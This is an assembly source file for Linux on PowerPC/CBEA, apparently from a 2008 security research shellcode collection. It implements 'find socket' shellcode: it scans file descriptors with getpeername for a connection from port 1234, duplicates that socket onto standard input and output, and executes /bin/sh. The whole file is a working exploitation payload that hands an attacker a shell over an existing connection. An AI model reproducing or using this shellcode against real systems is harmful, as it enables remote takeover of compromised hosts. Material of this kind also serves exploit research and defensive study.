/*
 *  $Id: lin-power-fndsockcode.S 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-power-fndsockcode.S - Linux Power/CBEA Find socket code
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -o lin-power-fndsockcode lin-power-fndsockcode.S
 *
 */

#include "linux-power.h"

    .globl main

main:

fndsockcode:
    xor     %r31,%r31,%r31
    lil     %r29,__CAL

    # getpeername

    stu     %r31,-4(%r1)
    mr      %r28,%r1
    cal     %r27,-511+16(%r29)
    stu     %r27,-4(%r1)
    mr      %r26,%r1

    stu     %r26,-4(%r1)
    stu     %r28,-4(%r1)
    stu     %r31,-4(%r1)

0:
    cal     %r31,511(%r31)
    cal     %r31,-511+1(%r31)

    cal     %r1,511(%r1)
    cal     %r1,-511+4(%r1)

    stu     %r31,-4(%r1)
    mr      %r4,%r1
    cal     %r3,__NC_getpeername(%r29)
    cal     %r0,__NC_socketcall(%r29)
    .long   0x44ffff02

    cal     %r25,511(%r28)
    lhz     %r25,-511+2(%r25)

    cmpli   0,%r25,1234
    bne     0b

    cal     %r24,-511+2(%r29)

1:
    # dup2

    mr      %r4,%r24
    mr      %r3,%r31
    cal     %r0,__NC_dup2(%r29)
    .long   0x44ffff02

    ai.     %r24,%r24,-1
    bge     1b

shellcode:
    # lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-511+36(%r30)
    stb     %r5,-511+43(%r30)
    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1
    # cal     %r0,__NC_execve(%r31)
    cal     %r0,__NC_execve(%r29)
    .long   0x44ffff02
    .asciz  "/bin/sh"

